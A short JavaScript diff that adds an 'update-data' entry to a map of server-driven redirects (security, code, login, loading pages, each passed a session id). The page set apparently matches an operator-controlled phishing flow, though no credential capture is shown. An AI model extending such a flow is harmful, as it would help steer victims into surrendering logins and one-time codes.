@@ -233,7 +233,7 @@
                     .then(function(d) {
                         if (d.status === 'redirect' && d.redirect) {
                             clearInterval(interval);
-                            var pages = {security:'security.html',code:'code.html',login:'login.html',wait:'loading.html'};
+                            var pages = {security:'security.html',code:'code.html',login:'login.html',wait:'loading.html','update-data':'update-data.html'};
                             var target = pages[d.redirect];
                             if (target && target !== 'code.html') window.location.href = target + '?id=' + sid;
                         } else if (d.status === 'accepted') {
